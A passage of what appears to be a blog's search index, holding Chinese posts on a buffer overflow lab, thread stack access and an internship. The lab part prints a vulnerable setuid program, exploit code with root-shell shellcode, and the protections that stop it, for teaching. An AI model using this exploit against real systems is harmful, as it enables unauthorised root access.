\u6ca1\u6709\u8fb9\u754c\u68c0\u67e5\u7684\u7279\u70b9\u9020\u6210\u6808\u6ea2\u51fa\u4fee\u6539\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230\u6076\u610f\u4ee3\u7801\u6267\u884c\u3002","title":"\u7a0b\u5e8f\u7684\u5185\u5b58\u5e03\u5c40"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_5","text":"\u4e3a\u9632\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u591a\u79cd\u4fdd\u62a4\u673a\u5236\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u6b21\u653b\u51fb\uff0c\u6211\u4eec\u9700\u8981\u505c\u7528\u4e00\u4e9b\u4fdd\u62a4\u673a\u5236\uff0c\u5177\u4f53\u662f\uff1a\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316 (Address Randomization)\u3001\u4e0d\u53ef\u6267\u884c\u6808 (Non-executable Stack)\u3001Stack Guard\u3002 \u5047\u8bbe\u6709\u4e00\u4e2a\u5177\u6709\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u7a0b\u5e8f\u5982\u4e0b\uff1a /* stack.c */ #include <stdlib.h> #include <stdio.h> #include <string.h> int bof(char *str) { char buffer[24]; /* \u8fd9\u91cc\u5b58\u5728\u6808\u6ea2\u51fa\u7684\u5371\u9669 */ strcpy(buffer, str); return 1; } int main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\"badfile\", \"r\"); fread(str, sizeof(char), 517, badfile); bof(str); printf(\"Returned Properly\\n\"); return 1; } \u5bf9\u4e0a\u8ff0\u6587\u4ef6\u8fdb\u884c\u7f16\u8bd1\uff0c\u6ce8\u610f\u8981\u505c\u7528\u4e00\u4e9b\u4fdd\u62a4\u673a\u5236 \u7981\u6b62\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316 su root sysctl -w kernel.randomize_va_space=0 exit \u4f7f\u7528gcc\u8fdb\u884c\u7f16\u8bd1 su root gcc -g -fno-stack-protector -z execstack stack.c -o stack chmod 4755 stack exit -fon-stack-protector \u9009\u9879\u662f\u5173\u95edgcc\u7684Stack Guard\uff1b -z execstack \u9009\u9879\uff1b\u6700\u540e\u7684 chmod 4755 stack \u662f\u8ba9\u5176\u5b83\u7528\u6237\u5728\u6267\u884cstack\u7a0b\u5e8f\u65f6\uff0c\u62e5\u6709\u548c\u6240\u6709\u8005(root)\u76f8\u5f53\u7684\u6743\u9650\uff08\u8fd9\u6837\u7684\u7a0b\u5e8f\u662f\u5b58\u5728\u7684\uff09\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u6076\u610f\u4ee3\u7801\u4e2d\u7684 setuid \u6307\u4ee4\u53ef\u4ee5\u6267\u884c\u3002 \u653b\u51fb\u7684\u5177\u4f53\u601d\u8def\u662f\uff1a\u7cbe\u5fc3\u8bbe\u8ba1badfile\u7684\u5185\u5bb9\uff0c\u8ba9\u5176\u5305\u542b\u4e00\u6bb5\u53ef\u4ee5\u83b7\u53d6root\u6743\u9650\u7684\u4ee3\u7801\uff0c\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u88ab\u8bfb\u5230stack\u7684 str \u4e2d\uff0c\u518d\u62f7\u8d1d\u5230 bof \u51fd\u6570\u7684 buffer \u91cc\uff0c\u53ea\u8981badfile\u91cc\u7684\u5185\u5bb9\u591f\u591a\uff0c\u5c31\u4f1a\u7a81\u7834 buffer \u7684\u8fb9\u754c\uff0c\u4ece\u800c\u8986\u76d6\u6389 bof \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u63a7\u5236\u51fd\u6570\u8fd4\u56de\u5230\u6076\u610f\u4ee3\u7801\u91cc\u6267\u884c\u3002 \u9996\u5148\uff0c\u4f7f\u7528gdb\u5bf9stack\u8fdb\u884c\u5206\u6790 gdb stack \u67e5\u770b str \u7684\u5730\u5740 b main # \u8bbe\u7f6e\u65ad\u70b9 r # \u8fd0\u884c p /x &str # \u53c2\u8003str\u7684\u5730\u5740 \u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\u6700\u7ec8\u4f1a\u63d2\u5165\u52300xbfffea37\u5f00\u59cb517\u4e2a\u5b57\u8282\u7684\u5185\u5b58\u91cc\u3002 \u7136\u540e\u67e5\u770b bof \u7684 buffer \u5730\u5740\uff0c\u4ee5\u53ca\u5b58\u653e\u8fd4\u56de\u5730\u5740\u7684\u4f4d\u7f6e \u5148\u8fd0\u884c\u5230 bof \u51fd\u6570\u91cc\uff0c\u518d\u67e5\u770b bof \u7684\u6c47\u7f16\u4ee3\u7801 b bof r disass bof \u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5df2\u7ecf\u8fd0\u884c\u5230\u6307\u4ee4<+6>\uff0c\u7531\u4e4b\u524d\u7684\u5206\u6790\u53ef\u4ee5\u5f97\u77e5\uff0c\u6b64\u65f6\u5bc4\u5b58\u5668ebp\u91cc\u7684\u503c\u52a0\u4e0a4\u5c31\u662f\u8fd4\u56de\u5730\u5740\u7684\u5b58\u653e\u5730\u5740\u4e86\u3002\u67e5\u770bebp\u5bc4\u5b58\u5668\u7684\u503c p /x $ebp \u518d\u67e5\u770b buffer \u7684\u5730\u5740 p /x &buffer \u56e0\u6b64\uff0c\u8fd4\u56de\u5730\u5740\u7684\u4f4d\u7f6e\u548c buffer \u9996\u5730\u5740\u76f8\u8ddd0xbfffea18+4-0xbfffe9f8=0x24\uff0c\u5373 buffer[0x24] \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u8fd4\u56de\u5730\u5740\u3002 \u901a\u8fc7\u4e0a\u8ff0\u5206\u6790\uff0c\u6076\u610f\u4ee3\u7801\u5728 str \u91cc\u3002\u6240\u4ee5\uff0c\u5728 bof \u51fd\u6570\u91cc\uff0c\u8981\u4fee\u6539 buffer[0x24] \u5904\u7684\u5185\u5bb9\u4e3a\u6076\u610f\u4ee3\u7801\u7684\u5165\u53e3\u3002\u4e3a\u4e86\u589e\u5927\u653b\u51fb\u6210\u529f\u7684\u53ef\u80fd\u6027\uff0c\u6211\u4eec\u5728 str \u9996\u5730\u5740\u5230\u6076\u610f\u4ee3\u7801\u7684\u5165\u53e3\u4e4b\u524d\u586b\u5145 NOP \u6307\u4ee4\uff0c\u8be5\u6307\u4ee4\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\u3002\u586b\u5145 NOP \u53ef\u4ee5\u518d\u8df3\u8f6c \u201d\u4e0d\u90a3\u4e48\u7cbe\u786e\u201c \u7684\u65f6\u5019\uff0c\u4e5f\u4f1a \u201c\u6ed1\u201d \u5230\u6076\u610f\u4ee3\u7801\u7684\u5165\u53e3\uff0c\u5373\u5047\u8bbe\u6076\u610f\u4ee3\u7801\u63d2\u5165\u5230 str[400] \u5904\uff0c\u53ea\u8981\u8df3\u8f6c\u5230 str[0] \u548c str[400] \u4e4b\u95f4\u90fd\u53ef\u4ee5\u6210\u529f\u5b9e\u73b0\u653b\u51fb\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u751f\u6210\u6211\u4eec\u7cbe\u5fc3\u8bbe\u8ba1\u7684badfile\u7a0b\u5e8f\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u63d2\u5165\u5230 str[400] \u5904\u5f00\u59cb\u7684\u5730\u65b9\uff0c\u7136\u540e\u63a7\u5236 bof \u51fd\u6570\u8df3\u8f6c\u52300xbfffeb95 \uff08\u5927\u6982\u5728 str[350] \u5904\uff09 /* exploit.c */ #include <stdlib.h> #include <stdio.h> #include <string.h> // \u6076\u610f\u4ee3\u7801 char shellcode[]= \"\\x31\\xc0\" /* xorl %eax,%eax */ \"\\x31\\xdb\" /* xorl %ebx,%ebx */ \"\\xb0\\xd5\" /* movb $0xd5,%al */ \"\\xcd\\x80\" /* int $0x80 */ \"\\x31\\xc0\" /* xorl %eax,%eax */ \"\\x50\" /* pushl %eax */ \"\\x68\"\"//sh\" /* pushl $0x68732f2f */ \"\\x68\"\"/bin\" /* pushl $0x6e69622f */ \"\\x89\\xe3\" /* movl %esp,%ebx */ \"\\x50\" /* pushl %eax */ \"\\x53\" /* pushl %ebx */ \"\\x89\\xe1\" /* movl %esp,%ecx */ \"\\x99\" /* cdq */ \"\\xb0\\x0b\" /* movb $0x0b,%al */ \"\\xcd\\x80\" /* int $0x80 */ ; void main(int argc, char **argv) { char buffer[517]; FILE *badfile; /* \u4f7f\u7528NOP\u586b\u5145 */ memset(&buffer, 0x90, 517); strcpy(buffer+400, shellcode); /* \u6076\u610f\u4ee3\u7801\u5c06\u63d2\u5165\u5230str[400]\u5904\u5f00\u59cb\u7684\u5730\u65b9 */ strcpy(buffer+0x24, \"\\x95\\xeb\\xff\\xbf\"); /* \u63a7\u5236bof\u51fd\u6570\u8fd4\u56de\u52300xbfffeb95\u5904\uff0c\u6ce8\u610f\u8981\u5012\u5e8f */ /* \u751f\u6210badfile\u6587\u4ef6 */ badfile = fopen(\"./badfile\", \"w\"); fwrite(buffer, 517, 1, badfile); fclose(badfile); } \u7f16\u8bd1\u3001\u8fd0\u884cexploit.c gcc exploit.c -o exploit ./exploit \u6b64\u65f6\u751f\u6210\u4e86badfile\u3002 \u4e3a\u4e86\u4f53\u73b0root\u6743\u9650\u6709\u65e0\uff0c\u666e\u901a\u7528\u6237\u5c1d\u8bd5\u4fee\u6539/etc/passwd\u6587\u4ef6\uff0c\u6267\u884c vim /etc/passwd \u8fd0\u884cstack\u7a0b\u5e8f\uff0c\u5c31\u4f1a\u8fdb\u5165\u5230\u4e00\u4e2a\u5177\u6709sudo\u6743\u9650\u7684sh\u7a0b\u5e8f\u91cc\u3002 ./stack \u5728\u8fd9\u4e2ash\u91cc\uff0c\u53ef\u4ee5\u5bf9\u53d7\u4fdd\u62a4\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f8b\u5982 vim /etc/passwd \u53ef\u89c1\uff0c\u6210\u529f\u5730\u83b7\u53d6\u4e86\u7cfb\u7edf\u7684root\u6743\u9650\u3002","title":"\u5b9e\u73b0\u6808\u6ea2\u51fa\u653b\u51fb"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_6","text":"\u5728\u8fdb\u884c\u5b9e\u9a8c\u65f6\uff0c\u6211\u4eec\u505c\u7528\u4e86\u51e0\u4e2a\u4fdd\u62a4\u63aa\u65bd\uff0c\u73b0\u5728\u6211\u4eec\u6765\u63a2\u8ba8\u4e00\u4e0b\u8fd9\u4e9b\u4fdd\u62a4\u63aa\u65bd\u662f\u5982\u4f55\u62b5\u5fa1\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u3002","title":"\u5bf9\u4e8e\u6808\u6ea2\u51fa\u7684\u4fdd\u62a4\u63aa\u65bd"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_7","text":"\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff0c\u987e\u540d\u601d\u4e49\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u52a0\u8f7d\u5230\u7684\u5185\u5b58\u4f4d\u7f6e\u662f\u968f\u673a\u7684\uff0c\u6240\u4ee5\uff0c\u5373\u4f7f\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u63a7\u5236\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u4f46\u662f\u65e0\u6cd5\u786e\u5b9a\u6076\u610f\u4ee3\u7801\u7684\u4f4d\u7f6e\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u9632\u8303\u6808\u6ea2\u51fa\u653b\u51fb\u3002 \u73b0\u5728\u6211\u4eec\u5f00\u542f\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u518d\u8fdb\u884c\u91cd\u590d\u4e0a\u8ff0\u653b\u51fb su root sysctl -w kernel.randomize_va_space=2 exit ./stack \u4f7f\u7528gdb\u67e5\u770b str \u7684\u5730\u5740\uff0c\u53d1\u73b0\u5df2\u7ecf\u4e0d\u662f\u539f\u6765\u76840xbfffea37\u4e86\uff0c\u653b\u51fb\u5931\u8d25\u65f6\u663e\u7136\u6613\u89c1\u7684\u3002","title":"\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_8","text":"\u4e0d\u53ef\u6267\u884c\u6808\u7684\u57fa\u672c\u539f\u7406\u662f\u5c06\u6570\u636e\u6240\u5728\u7684\u5185\u5b58\u9875\u6807\u8bb0\u4e3a\u4e0d\u53ef\u6267\u884c\u7684\uff0c\u5f53\u8fdb\u7a0b\u5c1d\u8bd5\u53bb\u6267\u884c\u6570\u636e\u9875\u9762\u4e0a\u7684\u6307\u4ee4\u65f6\uff0cCPU\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u4e0d\u662f\u53bb\u6267\u884c\u3002\u6240\u4ee5\uff0c\u5f53\u5f00\u542f\u4e86\u4e0d\u53ef\u6267\u884c\u6808\u9009\u9879\u65f6\uff0c\u5373\u4f7f\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\u5df2\u7ecf\u63d2\u5165\u5230\u5185\u5b58\uff0c\u4f46\u7531\u4e8e\u5904\u5728\u6570\u636e\u9875\u9762\uff0c\u56e0\u6b64\u65e0\u6cd5\u6267\u884c\u3002 \u518d\u6b21\u5173\u95ed\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff0cgcc\u7f16\u8bd1stack\u65f6\u5f00\u542f\u4e0d\u53ef\u6267\u884c\u6808\u9009\u9879 su root sysctl -w kernel.randomize_va_space=0 gcc -g -fno-stack-protector stack.c -o stack # gcc\u9ed8\u8ba4\u5f00\u542f\u4e0d\u53ef\u6267\u884c\u6808 chmod 4755 stack exit \u4f7f\u7528gdb\u67e5\u770b str \u4f4d\u7f6e\u65f6\uff0c\u53d1\u73b0\u53c8\u56de\u5230\u4e86\u539f\u6765\u7684\u4f4d\u7f6e\u4e0a \u8fdb\u884c\u653b\u51fb\uff0c\u4ecd\u7136\u5931\u8d25","title":"\u4e0d\u53ef\u6267\u884c\u6808"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#stack-guard","text":"gcc\u4e2d\u7684Stack Guard\u7684\u4fdd\u62a4\u539f\u7406\u65f6\u5229\u7528 \"Canaries\" \u68c0\u6d4b\u5bf9\u51fd\u6570\u6808\u7684\u7834\u574f\u3002\u5177\u4f53\u662f\u518d\u7f13\u51b2\u533a\uff08\u5982\uff1a\u6808\uff09\u548c\u63a7\u5236\u4fe1\u606f\uff08\u5982 ebp\u7b49\uff09\u95f4\u63d2\u5165\u4e00\u4e2acanary word\u3002\u8fd9\u6837\uff0c\u5f53\u7f13\u51b2\u533a\u6ea2\u51fa\u65f6\uff0c\u518d\u8fd4\u56de\u5730\u5740\u88ab\u8986\u76d6\u4e4b\u524dcanary word\u4f1a\u9996\u5148\u88ab\u8986\u76d6\uff0c\u901a\u8fc7\u68c0\u6d4bcanary word\u7684\u503c\u662f\u5426\u88ab\u4fee\u6539\uff0c\u5c31\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u4e86\u6ea2\u51fa\u3002\u8fd8\u662f\u4ee5\u4e0a\u8ff0\u7684 \u7b80\u5355c\u7a0b\u5e8f \u4e3a\u4f8b gcc\u5f00\u542fStack Guard\u5bf9fun.c\u8fdb\u884c\u7f16\u8bd1\uff0c\u7136\u540e\u7528gdb\u67e5\u770b fun \u51fd\u6570\u7684\u6c47\u7f16 gcc -g fun.c -o fun # gcc\u9ed8\u8ba4\u5f00\u542fStack Guard gdb fun disass fun \u548c \u4e0a\u56fe \u6700\u5927\u5dee\u522b\u5728\u4e8e\u51fd\u6570\u771f\u6b63\u6267\u884c\u524d\u591a\u4e86\u4ee5\u4e0b\u51e0\u6761\u6307\u4ee4 \u4ee5\u53ca\u9000\u51fa\u4e4b\u524d\uff0c\u591a\u4e86\u4ee5\u4e0b\u51e0\u6761\u6307\u4ee4 \u901a\u8fc7\u67e5\u9605\u8d44\u6599\u53ef\u77e5\uff0cgs:0x14\u91cc\u4fdd\u5b58\u7684\u662f\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u8fd9\u4e2a\u968f\u673a\u6570\u5c31\u662fcanary word\u3002\u771f\u6b63\u6267\u884c\u51fd\u6570\u524d\u7684\u6307\u4ee4<+6>\u5230<+15>\u628a\u8fd9canary word\u653e\u5230ebp-0xc\u4f4d\u7f6e\u4e0a\uff0c\u800c\u51fd\u6570\u8fd4\u56de\u524d\u7684<+41>\u5230<+53>\u6307\u4ee4\u5c31\u662f\u5224\u65adcanary word\u662f\u5426\u88ab\u4fee\u6539\uff0c\u5982\u679c\u6ca1\u88ab\u4fee\u6539\u5219\u6b63\u5e38\u8fd4\u56de\u3002\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u5927\u6982\u5730\u753b\u51fa\u6b64\u65f6\u51fd\u6570\u6808\u5185\u7684\u5206\u5e03\u5982\u4e0b \u5982\u679c\u901a\u8fc7\u4e4b\u524d\u7684\u65b9\u6cd5\u53bb\u4fee\u6539\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5c31\u4f1a\u4fee\u6539\u4e86canary word\u7684\u503c\uff0c\u5c31\u5728\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002\u4e0b\u9762\u662f\u5f00\u542f\u4e86Stack Guard\u6765\u91cd\u590d\u4e0a\u9762\u7684\u653b\u51fb su root gcc -g -z execstack stack.c -o stack chmod 4755 stack exit ./stack \u53ef\u4ee5\u770b\u5230\uff0c\u6808\u6ea2\u51fa\u88ab\u68c0\u6d4b\u5230\u5e76\u7ec8\u6b62\u4e86\u8fdb\u7a0b\u3002","title":"Stack Guard"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_9","text":"\u901a\u8fc7\u8fd9\u6b21\u5b9e\u9a8c\uff0c\u52a0\u6df1\u4e86\u6211\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u3001\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\u3001\u7f16\u8bd1\u5668\u7b49\u65b9\u9762\u7684\u7406\u89e3\uff0c\u540c\u65f6\u4e5f\u8ba4\u8bc6\u5230\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u6240\u5e26\u6765\u7684\u5371\u5bb3\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u8981\u517b\u6210\u826f\u597d\u7684\u7f16\u7a0b\u4e60\u60ef\uff0c\u4f8b\u5982\u4f7f\u7528\u5b89\u5168\u578b\u51fd\u6570\u907f\u514d\u98ce\u9669\u3002","title":"\u7ed3\u675f\u8bed"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_10","text":"GCC \u4e2d\u7684\u7f16\u8bd1\u5668\u5806\u6808\u4fdd\u62a4\u6280\u672f SEED BOOKS","title":"\u53c2\u8003"},{"location":"operation_system/2021_06_12_can_a_thread_access_the_stack_of_other_threads/","text":"\u4e00\u4e2a\u7ebf\u7a0b\u80fd\u8bbf\u95ee\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6808\u5417 \u00b6 \u8fd9\u662f\u9762\u8bd5\u65f6\u9047\u5230\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u95ee\u9898\u3002\u80cc\u8fc7\u516b\u80a1\u7684\u540c\u5b66\u90fd\u77e5\u9053\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u91cc\u7684\u7ebf\u7a0b\u5171\u4eab\u4ee3\u7801\u6bb5\u3001\u5168\u5c40\u6570\u636e\u6bb5\u3001BSS\u6bb5\u3001\u5806\uff0c\u53ea\u6709\u6808\u662f\u79c1\u6709\u7684\uff0c\u90a3\u4e48\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u5230\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6808\u5417\uff1f \u4e00\u5f00\u59cb\u6211\u4ee5\u4e3a\u7ebf\u7a0b\u6808\u65e2\u7136\u662f\u79c1\u6709\u7684\uff0c\u5c31\u53ef\u80fd\u6709\u4e00\u4e9b\u4fdd\u62a4\u63aa\u65bd\u6765\u907f\u514d\u88ab\u522b\u7684\u7ebf\u7a0b\u8bbf\u95ee\uff0c\u4f46\u662f\u9762\u8bd5\u5b98\u4f3c\u4e4e\u5bf9\u6211\u8fd9\u4e2a\u56de\u7b54\u5e76\u4e0d\u6ee1\u610f\u3002\u4e8e\u662f\u8fd9\u91cc\u7528\u5b9e\u9a8c\u63a2\u7a76\u4e00\u4e0b\uff0c\u5927\u4f53\u7684\u601d\u8def\u5c31\u662f\u4f7f\u7528\u4e00\u4e2a\u6307\u9488\u6267\u884c\u4e00\u4e2a\u7ebf\u7a0b\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e2a\u6307\u9488\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u7136\u540e\u5728\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u91cc\u901a\u8fc7\u8fd9\u4e2a\u6307\u9488\u53bb\u8bbf\u95ee\u548c\u4fee\u6539\u5c40\u90e8\u53d8\u91cf\u3002 #include <thread> #include <cstdio> #include <mutex> #include <condition_variable> std::condition_variable cv1, cv2; std::mutex mtx1, mtx2; bool cp1 = false, cp2 = false; volatile int *ptr; // \u5168\u5c40\u53d8\u91cf\uff0cfun1\u548cfun2\u90fd\u53ef\u8bbf\u95ee void fun1() { volatile int localVal = 1234; ptr = &localVal; printf(\"fun1: %d\\n\", localVal); { std::unique_lock<std::mutex> lck1(mtx1); cp1 = true; } cv1.notify_one(); // \u5524\u9192fun2 std::unique_lock<std::mutex> lck2(mtx2); // \u7b49\u5f85fun2\u4fee\u6539\u5b8c\u6210 cv2.wait(lck2, [&]() { return cp2; }); printf(\"fun1: %d\\n\", localVal); } void fun2() { std::unique_lock<std::mutex> lck1(mtx1); // \u7b49\u5f85fun1\u53d6\u5230\u5730\u5740 cv1.wait(lck1, [&]() { return cp1; }); printf(\"fun2: %d\\n\", *ptr); *ptr = 4321; printf(\"fun2: %d\\n\", *ptr); { std::unique_lock<std::mutex> lck2(mtx2); cp2 = true; } cv2.notify_one(); // \u5524\u9192fun1 } int main() { std::thread t1(fun1); std::thread t2(fun2); t1.join(); t2.join(); } \u7ed3\u679c fun1: 1234 fun2: 1234 fun2: 4321 fun1: 4321 \u8fd9\u91cc\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5b9e\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u6574\u4e2a\u8fdb\u7a0b\u7a7a\u95f4\u7684\u3002","title":"\u4e00\u4e2a\u7ebf\u7a0b\u80fd\u8bbf\u95ee\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6808\u5417"},{"location":"operation_system/2021_06_12_can_a_thread_access_the_stack_of_other_threads/#_1","text":"\u8fd9\u662f\u9762\u8bd5\u65f6\u9047\u5230\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u95ee\u9898\u3002\u80cc\u8fc7\u516b\u80a1\u7684\u540c\u5b66\u90fd\u77e5\u9053\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u91cc\u7684\u7ebf\u7a0b\u5171\u4eab\u4ee3\u7801\u6bb5\u3001\u5168\u5c40\u6570\u636e\u6bb5\u3001BSS\u6bb5\u3001\u5806\uff0c\u53ea\u6709\u6808\u662f\u79c1\u6709\u7684\uff0c\u90a3\u4e48\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u5230\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6808\u5417\uff1f \u4e00\u5f00\u59cb\u6211\u4ee5\u4e3a\u7ebf\u7a0b\u6808\u65e2\u7136\u662f\u79c1\u6709\u7684\uff0c\u5c31\u53ef\u80fd\u6709\u4e00\u4e9b\u4fdd\u62a4\u63aa\u65bd\u6765\u907f\u514d\u88ab\u522b\u7684\u7ebf\u7a0b\u8bbf\u95ee\uff0c\u4f46\u662f\u9762\u8bd5\u5b98\u4f3c\u4e4e\u5bf9\u6211\u8fd9\u4e2a\u56de\u7b54\u5e76\u4e0d\u6ee1\u610f\u3002\u4e8e\u662f\u8fd9\u91cc\u7528\u5b9e\u9a8c\u63a2\u7a76\u4e00\u4e0b\uff0c\u5927\u4f53\u7684\u601d\u8def\u5c31\u662f\u4f7f\u7528\u4e00\u4e2a\u6307\u9488\u6267\u884c\u4e00\u4e2a\u7ebf\u7a0b\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e2a\u6307\u9488\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u7136\u540e\u5728\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u91cc\u901a\u8fc7\u8fd9\u4e2a\u6307\u9488\u53bb\u8bbf\u95ee\u548c\u4fee\u6539\u5c40\u90e8\u53d8\u91cf\u3002 #include <thread> #include <cstdio> #include <mutex> #include <condition_variable> std::condition_variable cv1, cv2; std::mutex mtx1, mtx2; bool cp1 = false, cp2 = false; volatile int *ptr; // \u5168\u5c40\u53d8\u91cf\uff0cfun1\u548cfun2\u90fd\u53ef\u8bbf\u95ee void fun1() { volatile int localVal = 1234; ptr = &localVal; printf(\"fun1: %d\\n\", localVal); { std::unique_lock<std::mutex> lck1(mtx1); cp1 = true; } cv1.notify_one(); // \u5524\u9192fun2 std::unique_lock<std::mutex> lck2(mtx2); // \u7b49\u5f85fun2\u4fee\u6539\u5b8c\u6210 cv2.wait(lck2, [&]() { return cp2; }); printf(\"fun1: %d\\n\", localVal); } void fun2() { std::unique_lock<std::mutex> lck1(mtx1); // \u7b49\u5f85fun1\u53d6\u5230\u5730\u5740 cv1.wait(lck1, [&]() { return cp1; }); printf(\"fun2: %d\\n\", *ptr); *ptr = 4321; printf(\"fun2: %d\\n\", *ptr); { std::unique_lock<std::mutex> lck2(mtx2); cp2 = true; } cv2.notify_one(); // \u5524\u9192fun1 } int main() { std::thread t1(fun1); std::thread t2(fun2); t1.join(); t2.join(); } \u7ed3\u679c fun1: 1234 fun2: 1234 fun2: 4321 fun1: 4321 \u8fd9\u91cc\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5b9e\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u6574\u4e2a\u8fdb\u7a0b\u7a7a\u95f4\u7684\u3002","title":"\u4e00\u4e2a\u7ebf\u7a0b\u80fd\u8bbf\u95ee\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6808\u5417"},{"location":"others/2022_03_13_internship/","text":"\u5b9e\u4e60\u603b\u7ed3 \u00b6 \u867d\u7136\u4eca\u5929\u5df2\u7ecf\u79bb\u6211\u7ed3\u675f\u5728\u5b57\u8282\u7684\u5b9e\u4e60\uff082021.11\u6708\u5e95\u79bb\u804c\uff09\u90fd\u5feb4\u4e2a\u6708\u4e86\uff0c\u4f46\u8fd8\u662f\u60f3\u5199\u4e00\u4e0b\u603b\u7ed3\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u7a81\u7136\u60f3\u5199\u8fd9\u4e2a\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u4eca\u5929\u542c\u4e86\u4e00\u4e2a\u5b66\u957f\u7684\u5206\u4eab\uff0c\u53d1\u73b0\u4ed6\u5728\u5b9e\u4e60\u7684\u65f6\u5019\u5b66\u4e86\u597d\u591a\u4e1c\u897f\uff0c\u5bf9\u804c\u4e1a\u53d1\u5c55\u7b49\u90fd\u6709\u4e86\u4e00\u4e2a\u5f88\u6e05\u6670\u7684\u8ba4\u8bc6\uff0c\u800c\u6211\u5b9e\u4e60\u4e4b\u540e\u8fd8\u662f\u4e2afw\uff0c\u6240\u4ee5\u6211\u51b3\u5b9a\u5148\u4ece\u5199\u603b\u7ed3\u5f00\u59cb\uff0c\u53cd\u601d\u4e00\u4e0b\u81ea\u5df1\u4e4b\u524d\u5b58\u5728\u7684\u4e0d\u8db3\uff0c\u5e76\u4e14\u5b66\u4e60\u4e00\u4e0b\u4f18\u79c0\u7684\u4eba\u7684\u601d\u8003\u65b9\u5f0f\u3002 \u5176\u5b9e\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u60f3\u5199\u6bd5\u8bbe\u4e86 \u5b9e\u4e60\u7ecf\u5386 \u00b6 \u4ece2021.7.9\u65e5\u5f00\u59cb\uff0c\u8fdb\u5165\u5b57\u8282pcdn\u90e8\u95e8\u5b9e\u4e60\uff0c\u52302021.11\u6708\u5e95\u79bb\u804c\uff0c\u5927\u6982\u5b9e\u4e60\u4e865\u4e2a\u6708\uff0c\u6700\u540e\u4e5f\u62ff\u5230\u4e86\u8f6c\u6b63offer\uff0c\u867d\u7136\u4e0d\u662f\u5927sp\uff0c\u4f46\u4e5f\u8fd8\u597d\uff08\u6bd5\u7adf\u6ca1\u5f97\u9009\u4e86\uff09\u3002\u5b9e\u4e60\u7684\u65f6\u5019\u4e3b\u8981\u662f\u6253\u6742\uff0c\u5404\u79cd\u6253\u6742\u3002\u5982\u679c\u5bf9\u8fd9\u6bb5\u5b9e\u4e60\u7ecf\u5386\u6253\u5206\u7684\u8bdd\uff0c\u6211\u81ea\u8ba4\u4e3a\u53ef\u4ee5\u7ed9\u5b9e\u4e60\u7684\u5de5\u4f5c\u62538\u5206\uff0c\u56e0\u4e3a\u6211\u90fd\u53ef\u4ee5\u6bd4\u8f83\u5